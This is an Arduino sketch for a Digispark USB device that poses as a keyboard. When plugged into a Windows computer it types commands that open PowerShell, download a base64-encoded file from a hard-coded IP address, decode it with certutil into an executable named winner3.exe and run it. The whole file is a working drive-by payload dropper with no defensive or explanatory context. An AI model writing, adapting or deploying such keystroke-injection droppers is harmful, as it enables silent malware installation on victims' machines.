#include "DigiKeyboard.h"

void setup() {
  delay(2000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  delay(500);
  DigiKeyboard.print("powershell");
  delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  delay(5000);

  DigiKeyboard.print("cd C:/Users/$env:username/AppData/Local/Temp");
  delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  delay(1000);

  DigiKeyboard.print("rm winner3.exe*");
  delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  delay(1000);

  DigiKeyboard.print("wget ");
  DigiKeyboard.print("http://164.92.72.82/b64");
  DigiKeyboard.print(" -o winner3.exe.b64");
  delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  delay(1000);

  DigiKeyboard.print("certutil -decode winner3.exe.b64 winner3.exe");
  delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  delay(1000);

  DigiKeyboard.print("./winner3.exe");
  delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  delay(1000);
}

void loop() {
  //empty
}
